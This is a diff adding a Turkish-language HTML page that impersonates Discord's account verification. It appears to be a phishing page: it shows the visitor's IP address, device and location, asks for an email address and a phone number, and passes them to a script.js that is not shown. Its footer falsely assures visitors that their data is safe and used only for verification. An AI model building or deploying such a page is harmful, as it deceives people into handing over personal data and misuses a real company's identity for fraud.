@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord • Hesap Doğrulama</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="verify-box">
+            <div class="success-icon" id="successIcon">✅</div>
+            <img src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Discord" class="discord-icon">
+            <h2 id="title">Hesap Doğrulaması Gerekli</h2>
+            <p class="desc" id="desc">Bu sunucuya erişmek için hesabını doğrula.</p>
+            
+            <div class="info-panel" id="infoPanel">
+                <div class="info-item">
+                    <span>🌐 IP Adresi:</span>
+                    <strong id="ipDisplay">Alınıyor...</strong>
+                </div>
+                <div class="info-item">
+                    <span>📱 Cihaz:</span>
+                    <strong id="deviceDisplay">Alınıyor...</strong>
+                </div>
+                <div class="info-item">
+                    <span>🌍 Konum:</span>
+                    <strong id="locationDisplay">Alınıyor...</strong>
+                </div>
+            </div>
+
+            <div class="form-area" id="formArea">
+                <div class="input-wrapper">
+                    <label>📧 Email Adresin</label>
+                    <input type="email" id="emailInput" placeholder="ornek@gmail.com">
+                    <span class="error-msg" id="emailError">Geçerli bir email adresi gir.</span>
+                </div>
+                
+                <div class="input-wrapper">
+                    <label>📱 Telefon Numaran</label>
+                    <input type="tel" id="phoneInput" placeholder="+90 555 123 4567">
+                    <span class="error-msg" id="phoneError">Geçerli bir telefon numarası gir.</span>
+                </div>
+
+                <button class="verify-btn" id="verifyBtn" onclick="verify()">
+                    Doğrula ve Katıl
+                </button>
+            </div>
+
+            <p class="footer-text">🔒 Bilgilerin güvende • Sadece doğrulama amaçlıdır</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
